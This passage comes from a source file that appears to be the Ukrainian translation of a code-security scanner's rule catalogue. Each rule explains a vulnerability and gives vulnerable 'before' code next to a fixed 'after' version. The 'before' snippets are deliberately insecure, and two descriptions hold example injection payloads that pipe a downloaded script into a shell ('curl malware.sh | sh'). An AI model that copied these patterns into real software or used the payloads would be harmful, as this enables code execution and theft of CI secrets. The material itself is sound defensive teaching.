      "Функція, яка виконує системні команди (exec, execSync, spawn), отримує рядок, побудований через інтерполяцію або конкатенацію. Якщо частина цього рядка надходить від введених користувачем даних, той, хто його контролює, може виконати довільні команди на сервері.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Файл на сервері можна прочитати або записати, обравши шлях ззовні",
    description:
      'Функція, яка читає, записує або надсилає файл, отримує шлях напряму зі значення запиту (query, body, params) без перевірки, що він залишається всередині дозволеної папки. Зловмисник може вставити "../", щоб вийти за межі очікуваної папки та прочитати або перезаписати довільні файли на сервері (напр. конфігураційний файл з обліковими даними).',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Шлях не дозволено")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Значення, введене користувачем, виконується як код усередині запиту MongoDB",
    description:
      "Оператор $where у MongoDB виконує JavaScript на стороні сервера для кожного документа — якщо цей рядок побудований шляхом конкатенації значення, яке надходить від користувача, той, хто його контролює, може змусити виконати довільний код у контексті бази даних, а не лише змінити фільтр, як при звичайній SQL injection.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Значення, введене користувачем, інтерпретується як шаблон, а не як дані",
    description:
      "Функція, яка компілює/виконує шаблон, отримує ЦІЛИЙ шаблон зі значення запиту, замість того, щоб використовувати фіксований шаблон і передавати лише дані. Зловмисник може писати напряму в синтаксисі шаблонного рушія (напр. {{7*7}} для Jinja2) і виконувати код на сервері — Server-Side Template Injection, що часто веде до виконання довільних команд, а не лише до проблеми з відображенням, як XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML-парсер можна змусити читати файли або робити зовнішні запити",
    description:
      "XML-парсер (DocumentBuilderFactory) створюється без явного вимкнення зовнішніх сутностей (DOCTYPE) у сусідніх рядках. Якщо парсер отримує XML з ненадійного джерела, зловмисник може визначити зовнішню сутність, щоб прочитати файли на сервері або змусити його звернутися до обраної ним адреси — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Секрет прописаний напряму в інструкції ENV або ARG Dockerfile",
    description:
      "Змінна з назвою на кшталт password/secret/token/key має буквальне значення в інструкції ENV або ARG. На відміну від файлу .env (який зазвичай не потрапляє в образ), це значення вбудовується в сам Docker-образ — будь-хто, хто може зробити pull або перевірити історію шарів, зможе його відновити, навіть якщо рядок видалено в пізнішій версії Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# передається через: docker build --build-arg DB_PASSWORD=*** (або, ще краще,\n# через secret mount BuildKit, який не потрапляє в історію шарів)`,
    },
  },
  "k8s-privileged-container": {
    title: "Контейнер у маніфесті Kubernetes працює як privileged",
    description:
      '"privileged: true" у securityContext контейнера вимикає майже всю звичайну ізоляцію між контейнером і хостом: контейнер може отримати доступ до пристроїв хоста, змінити його мережеву конфігурацію і в багатьох випадках фактично отримати root-доступ до машини, яка його виконує. Майже ніколи не потрібно для звичайного застосунку.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # лише справді необхідні capability`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Секрет записаний відкритим текстом у змінній env маніфесту Kubernetes",
    description:
      'Змінна середовища з назвою на кшталт password/secret/token/key має буквальне значення ("value:") замість того, щоб зчитуватися з Secret ("valueFrom.secretKeyRef"). Сам маніфест — часто закомічений у репозиторій — тому містить секрет відкритим текстом, видимим навіть для того, хто може лише читати конфігурацію, а не обов\'язково виконувати команди в кластері.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Security group Terraform відкриває чутливий порт для всього інтернету",
    description:
      'Правило з "cidr_blocks", що включає 0.0.0.0/0 (будь-яку IP-адресу), знаходиться поряд із чутливим портом — SSH (22), RDP (3389) або типовим портом бази даних (MySQL, Postgres, MongoDB, Redis, SQL Server). Будь-хто в інтернеті може спробувати підключитися до цього сервісу, а не лише той, хто повинен.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # лише ваша приватна мережа або bastion-хост\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Правило брандмауера Google Cloud відкриває чутливий порт для всього інтернету",
    description:
      'Ресурс "google_compute_firewall" з "source_ranges", що включає 0.0.0.0/0 (будь-яку IP-адресу), дозволяє трафік до чутливого порту — SSH (22), RDP (3389) або типового порту бази даних (MySQL, Postgres, MongoDB, Redis, SQL Server). Будь-хто в інтернеті може спробувати підключитися до цього сервісу, а не лише той, хто повинен.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # лише ваша приватна мережа або bastion-хост\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Правило мережі Azure відкриває чутливий порт для всього інтернету",
    description:
      'Правило безпеки мережі ("azurerm_network_security_rule", або блок "security_rule" всередині "azurerm_network_security_group") із "source_address_prefix" на "*" або "0.0.0.0/0", напрямком "Inbound" і доступом "Allow", поряд із чутливим портом — SSH (22), RDP (3389) або типовим портом бази даних. Будь-хто в інтернеті може спробувати підключитися до цього сервісу, а не лише той, хто повинен.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # лише ваша приватна мережа або bastion-хост\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Секрет записаний як значення за замовчуванням змінної Terraform",
    description:
      'Змінна з назвою на кшталт password/secret/token/key має буквальне значення у своєму "default". На відміну від значення, переданого під час виконання (tfvars, змінні середовища TF_VAR_*), значення за замовчуванням потрапляє у вихідний код — і якщо репозиторій спільний або публічний, будь-хто його побачить, навіть без доступу до стану Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # без значення за замовчуванням: передавайте через файл .tfvars (поза git) або змінну середовища TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Значення, яке контролює зовнішній користувач, напряму потрапляє в команду shell CI",
    description:
      'Команда "run:" у workflow GitHub Actions напряму інтерполює значення на кшталт заголовка pull request, назви гілки або тексту коментаря — усе це може написати будь-хто, хто відкриває pull request чи коментар, навіть з зовнішнього форку. Значення на кшталт `"; curl malware.sh | sh #` виконало б довільні команди в CI з доступом до всіх секретів, доступних у цьому workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # передається як змінна середовища, ніколи не інтерполюється напряму в команду`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflow виконує код зовнішнього pull request з доступом до секретів репозиторію",
    description:
      'Workflow використовує "pull_request_target" — який працює з правами та секретами базового репозиторію навіть для pull request, відкритого з несв\'язаного форку — і робить checkout коду самого pull request ("github.event.pull_request.head"), а не базової гілки. Той, хто відкриває pull request, фактично отримує виконання свого коду з доступом до цих секретів.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Робить checkout базової гілки, а не коду PR — або використовуйте\n      # "pull_request" замість "pull_request_target", якщо ширші\n      # права/секрети не потрібні.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Дані запиту десеріалізуються у форматі, який може виконувати код",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) або бібліотека node-serialize (Node) десеріалізують значення, взяте напряму із запиту. На відміну від JSON, ці формати можуть представляти й виконувати код під час самої десеріалізації — той, хто контролює надіслане значення, може досягти виконання довільного коду на сервері.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON ніколи не виконує код під час парсингу, на відміну від pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Код явно приймає непідписані JWT-токени (алгоритм "none")',
    description:
      '"none" з\'являється серед алгоритмів, прийнятих для перевірки JWT-токена. Токен з алгоритмом "none" не має підпису для перевірки: будь-хто може створити такий з будь-яким вмістом (напр. роль адміністратора), і код прийме його як дійсний.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // ніколи не включайте "none" серед прийнятих алгоритмів`,
    },
  },
  "unprotected-new-table": {
    title: "Схоже, нова таблиця створена без захисту",
    description:
      "SQL-міграція створює таблицю, але не вмикає Row Level Security для цієї ж таблиці в тому самому файлі. Поки це так, таблиця з'являється без жодного обмеження на те, хто може її читати чи записувати.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Сайт приймає запити з будь-якого іншого сайту",
    description:
      "Заголовок CORS налаштований так, щоб приймати запити з будь-якого джерела (*), або middleware cors() використовується без обмежень. Будь-який сторонній сайт може викликати ваші API з браузера вже автентифікованого користувача.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Функція з правами адміністратора не перевіряє, хто нею користується",
    description:
      "Маршрут або функція, назва якої натякає на адміністративні операції, не містить у сусідніх рядках жодної перевірки автентифікації чи ролі. Будь-хто, хто знає URL, міг би її виконати.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Сайт можна змусити виконати зовнішній код",
    description:
      "Вихідний HTTP-запит (fetch, axios) напряму використовує значення, що надходить із запиту користувача, як URL призначення. Зловмисник може змусити ваш сервер звертатися до внутрішніх або довільних адрес — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL не дозволено")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Паролі захищені методом, який тепер легко зламати",
    description:
      "У тому самому рядку md5() або sha1() застосовуються до значення, пов'язаного з паролем. Ці алгоритми обчислюються надто швидко: зловмисник із базою даних може перебрати мільярди паролів за секунду.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Контейнер у маніфесті Kubernetes налаштований на роботу як root",
    description:
      '"runAsUser: 0" або "runAsNonRoot: false" у securityContext явно вимагають виконання як root усередині контейнера. Якщо зловмиснику вдасться виконати код у контейнері (напр. скориставшись вразливою бібліотекою), root усередині контейнера полегшує можливу втечу на хост або ширший вплив.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Контейнер у маніфесті Kubernetes може отримати більше привілеїв, ніж мав спочатку",
    description:
      '"allowPrivilegeEscalation: true" у securityContext дозволяє процесу всередині контейнера отримати більше привілеїв, ніж мав процес, що його запустив (напр. через бінарник із setuid). У поєднанні з вразливістю в застосунку це ще один крок до виконання коду з більшими привілеями, ніж передбачалося.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Под у маніфесті Kubernetes ділить мережу, процеси або спільну пам'ять хоста",
    description:
      '"hostNetwork", "hostPID" або "hostIPC", встановлені в true, виводять под з його звичайної ізоляції: hostNetwork виставляє под у мережу хоста (обходячи мережеві політики кластера), hostPID дає йому видимість усіх процесів хост-машини, hostIPC дає доступ до спільної пам\'яті хоста. Майже ніколи не потрібно для звичайного застосунку — типово лише для низькорівневих системних/моніторингових інструментів.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access вимкнено на S3-бакеті, визначеному в Terraform",
    description:
      'Один або кілька з чотирьох захистів "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) встановлені в false. Це не означає, що бакет уже публічний, але знімає запобіжник, який завадив би зробити його публічним помилково в майбутньому.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "IAM-політика, визначена в Terraform, надає повний доступ",
    description:
      'Statement з дією "*" і ресурсом "*" надає повний доступ до кожного сервісу й ресурсу AWS — та сама перевірка, що вже робиться на живому стані IAM, тут зчитана напряму з коду ще до застосування. Можливо, це навмисно для аварійної ролі, але це варто підтвердити: для щоденного використання надавайте лише справді необхідні права.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Бакет Google Cloud Storage зроблено доступним для читання будь-ким",
    description:
      'Ресурс "google_storage_bucket_iam_member" або "google_storage_bucket_iam_binding" надає роль "allUsers" або "allAuthenticatedUsers" — перше робить бакет доступним для читання будь-ким в інтернеті, навіть без облікового запису Google; друге — будь-ким з будь-яким обліковим записом Google, а не лише тим, хто повинен мати доступ.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # лише той, хто справді повинен мати доступ, а не allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Публічний доступ до blob увімкнено на обліковому записі сховища Azure",
    description:
      '"allow_blob_public_access" встановлено в true на "azurerm_storage_account": будь-хто, хто знає URL зробленого публічним blob/контейнера, може його прочитати без жодної автентифікації.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "IAM-роль Google Cloud надає повний доступ (Owner/Editor)",
    description:
      '"google_project_iam_binding"/"google_project_iam_member" (або еквівалент на рівні організації/папки) призначає примітивну роль "roles/owner" або "roles/editor" — майже повний доступ до кожного сервісу в проєкті. Можливо, це навмисно для аварійного облікового запису, але це варто підтвердити: для щоденного використання надавайте лише справді необхідні, конкретніші попередньо визначені ролі.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # лише справді потрібна попередньо визначена роль, а не roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Призначення ролі Azure надає повний доступ (Owner)",
    description:
      '"azurerm_role_assignment" призначає роль "Owner" — повний доступ, включно з контролем над правами інших користувачів, у межах усього призначеного обсягу (підписка, група ресурсів...). Можливо, це навмисно для аварійного облікового запису, але це варто підтвердити: для щоденного використання надавайте лише справді потрібну конкретнішу роль (напр. "Contributor" на одній групі ресурсів).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # лише справді потрібна конкретніша роль, а не Owner на всій підписці\n}`,
    },
  },
  "weak-random-token": {
    title: "Токен безпеки згенеровано за допомогою генератора випадкових чисел, який не є криптографічно надійним",
    description:
      "Значення з назвою на кшталт token/session/reset/otp/csrf генерується за допомогою Math.random() (JS), random.random() (Python) або rand() (PHP) — генераторів, не призначених для безпеки, послідовності яких передбачувані. Токен, згенерований таким чином, можна вгадати або відтворити, що зводить нанівець мету, заради якої він існує (напр. посилання для скидання пароля, яке будь-хто міг би передбачити).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, а не Math.random — непередбачувано`,
    },
  },
  "ldap-injection": {
    title: "LDAP-фільтр побудований шляхом прямої конкатенації значення запиту",
    description:
      'Рядок, що будує LDAP-фільтр (напр. "(uid=...)"), напряму включає значення, взяте із запиту, без жодного екранування спеціальних символів LDAP. Той, хто контролює це значення, може змінити логіку фільтра — наприклад, обійти перевірку автентифікації або прочитати дані каталогу, які не повинен бачити.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // спеціальні символи LDAP завжди потрібно екранувати перед використанням у фільтрі\nclient.search(base, { filter });`,
    },
  },
  "xss-dangerous-html": {
    title: "Текст, написаний користувачами, міг би виконати код у браузері",
    description:
      "Вміст вставляється на сторінку як сирий HTML (dangerouslySetInnerHTML, v-html, .innerHTML) замість звичайного тексту. Якщо цей вміст включає введені користувачем дані, він може містити скрипти, які виконуються в браузері того, хто читає сторінку.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// або, якщо потрібен HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Простір для завантажених файлів видимий будь-кому",
    description:
      "Бакет сховища (Supabase Storage, S3) налаштовано як публічний. Якщо він містить документи, фото чи файли, завантажені користувачами, будь-хто, хто знає — або вгадає — шлях, може отримати до них доступ без автентифікації.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// надавайте файли через тимчасові підписані URL: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Достатньо одного посилання, щоб видалити або змінити дані",
    description:
      "GET-маршрут виконує операцію, яка змінює дані (шлях містить delete/remove/update/edit). GET-запити виконуються навіть просто при відвідуванні посилання або завантаженні зображення зі стороннього сайту — класична опорна точка для CSRF-атаки.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Дані входу, збережені в браузері, захищені не дуже добре",
    description:
      "Токен доступу зберігається в localStorage. На відміну від cookie httpOnly, будь-який скрипт, що виконується на сторінці (включно зі зловмисним, впровадженим через XSS), може його прочитати й викрасти.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// встановлюйте токен як cookie httpOnly із сервера:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Сайт можна використати для перенаправлення на шахрайський сайт",
    description:
      "Сайт перенаправляє користувача на адресу, взяту напряму із запиту (query, body, params), без перевірки, що це відомий домен. Посилання, яке виглядає так, ніби веде на ваш сайт, насправді може вести на фішингову сторінку.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Змінивши число в адресі, можна побачити чужі дані",
    description:
      "Запит до бази даних напряму використовує ідентифікатор, взятий з URL (req.params.id), без перевірки в сусідніх рядках, що він належить користувачу, який робить запит. Змінивши id в адресі, можна отримати доступ до даних іншого користувача — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Форма входу не блокує забагато спроб поспіль",
    description:
      "Маршрут входу визначений у файлі, але в тому самому файлі немає жодних слідів middleware для обмеження частоти запитів. Без обмеження на кількість спроб зловмисник може перебирати паролі послідовно (brute force), не зустрічаючи уповільнення.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Паролі або чутливі дані потрапляють у логи",
    description:
      "Виклик console.log (або подібний) включає змінну з назвою password, token, secret або apiKey. Якщо ці логи потрапляють у зовнішній сервіс або файл, чутливі дані залишаються відкритими значно довше, ніж потрібно.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "header-injection": {
    title: "Значення запиту напряму потрапляє в заголовок HTTP-відповіді",
    description:
      "Заголовок HTTP-відповіді встановлюється зі значенням, взятим напряму із запиту (query, body, params), без перевірки, що воно не містить переносу рядка (CRLF). Зловмисник може вставити додаткові заголовки або навіть цілком іншу відповідь — response splitting — отримуючи змогу маніпулювати кешем, cookie або вмістом, показаним іншим користувачам.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile не встановлює користувача, відмінного від root",
    description:
      "У Dockerfile немає інструкції USER: без неї контейнер працює як root. Якщо зловмиснику вдається виконати код усередині контейнера (напр. скориставшись вразливою бібліотекою), root усередині контейнера полегшує можливу втечу на хост — або ширший вплив на навколишню систему.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Маніфест Kubernetes явно не вимагає виконання від імені користувача, відмінного від root",
    description:
      'У маніфесті немає жодного "runAsNonRoot" (ні на рівні пода, ні контейнера): без цього налаштування контейнер працює від імені користувача, визначеного в його образі — часто root за замовчуванням, якщо сам образ цього не змінив. Явне встановлення в true призводить до того, що под не запуститься, якщо образ усе ж намагається працювати як root, замість того щоб дізнатися про це лише після інциденту.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Стороння дія в CI не зафіксована на точній версії (commit SHA)",
    description:
      'Workflow використовує сторонню дію, на яку посилаються за тегом або гілкою (напр. "@v1", "@main"), а не за commit SHA. Той, хто її підтримує — або хто скомпрометує його обліковий запис — може будь-коли перемістити це посилання на інший commit, непомітно змінивши те, що виконується в CI, з доступом до його секретів. Commit SHA завжди вказує на той самий код.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, зафіксовано на commit SHA — оновлюйте SHA, коли оновлюєте версію`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflow надає собі всі права токена замість лише тих, що використовує",
    description:
      '"permissions: write-all" надає GITHUB_TOKEN workflow права на запис до всього — issues, pull request, пакетів, деплоїв — навіть якщо workflow використовує лише частину цього. Якщо якийсь крок workflow буде скомпрометовано (зловмисна залежність, впроваджений скрипт), ці ширші права збільшують те, що може зробити той, хто цим скористається.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # лише права, які workflow справді використовує`,
    },
  },
  "insecure-cookie-flags": {
    title: "Cookie сесії або автентифікації встановлено без прапорців Secure і HttpOnly",
    description:
      'Cookie з назвою, схожою на session/auth/token, встановлюється без "httpOnly" і "secure" серед своїх параметрів. Без httpOnly JavaScript на сторінці — включно з кодом, впровадженим через XSS, — може прочитати цей cookie. Без secure його також можна надіслати через незашифроване HTTP-з\'єднання.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Вразлива залежність:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Виправлену версію ще не відомо — розгляньте альтернативний пакет або стежте за оновленнями проєкту."
      ),
    },
  }),
  "docker-unpinned-base-image": {
    title: 'Базовий образ Dockerfile використовує тег ":latest"',
    description:
      'Інструкція FROM явно використовує тег ":latest" замість точної версії. "latest" змінюється з часом: та сама збірка, повторена в інший момент, може отримати іншу версію базового образу — невідтворювана збірка, і небажане оновлення може прийти без чийогось рішення про це.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile завантажує віддалений файл через ADD замість COPY",
    description:
      "Інструкція ADD з URL http/https завантажує файл з інтернету під час збірки без перевірки цілісності та без видимості вмісту в репозиторії. Якщо цю URL-адресу колись скомпрометують, збірка включить довільний вміст, і ніхто цього не помітить, читаючи Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<очікуваний hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'Значення, яке контролює зовнішній користувач, проходить через другу оболонку в пайплайні GitLab CI',
      description: 'Рядок "script:" (або "before_script:"/"after_script:") використовує "eval" чи "sh -c"/"bash -c" разом із попередньо визначеною змінною GitLab, такою як заголовок merge request, повідомлення коміту чи назва гілки — усе це може написати будь-хто, хто відкриває merge request, навіть із зовнішнього форку. Значення спочатку розгортається зовнішньою оболонкою, а потім вставляється в рядок, який друга оболонка знову інтерпретує як код: заголовок на кшталт "$(curl malware.sh | sh)" виконав би довільні команди в пайплайні з доступом до всіх секретів, доступних у цьому завданні.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # передано як аргумент команді, ніколи всередині рядка "bash -c", який би повторно його інтерпретував`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker у пайплайні GitLab CI працює з вимкненим TLS-шифруванням',
      description: 'Завдання використовує сервіс "docker:dind" (Docker-in-Docker, потрібен для збирання образів усередині пайплайну), але встановлює "DOCKER_TLS_CERTDIR" як порожній рядок, повністю вимикаючи TLS-шифрування між клієнтом Docker і демоном dind. Без TLS будь-хто, хто може дістатися до цього порту в тій самій внутрішній мережі раннера, може керувати демоном Docker — який працює з розширеними привілеями — замість того, щоб бути обмеженим лише тим завданням, яке має його використовувати.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS залишається увімкненим між клієнтом Docker і демоном dind — "" повністю вимикає його`,
      },
    },
    "gitlab-ci-unpinned-image": {
